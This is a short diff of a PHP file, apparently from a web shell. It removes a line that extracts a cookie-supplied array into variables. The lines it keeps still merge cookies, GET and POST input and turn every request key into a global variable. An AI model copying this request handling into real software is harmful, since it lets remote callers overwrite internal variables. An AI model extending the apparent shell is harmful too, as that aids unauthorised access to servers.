@@ -55,7 +55,6 @@ define("starttime",getmicrotime());
 if (get_magic_quotes_gpc()) { strips($GLOBALS); }
 $_REQUEST = array_merge($_COOKIE,$_GET,$_POST);
 @$f = $_REQUEST["f"];
-@extract($_REQUEST["exshcook"]);
 foreach($_REQUEST as $k => $v) { if (!isset($$k)) { $$k = $v; } }
 if ($surl_autofill_include) {
   $include = "&";
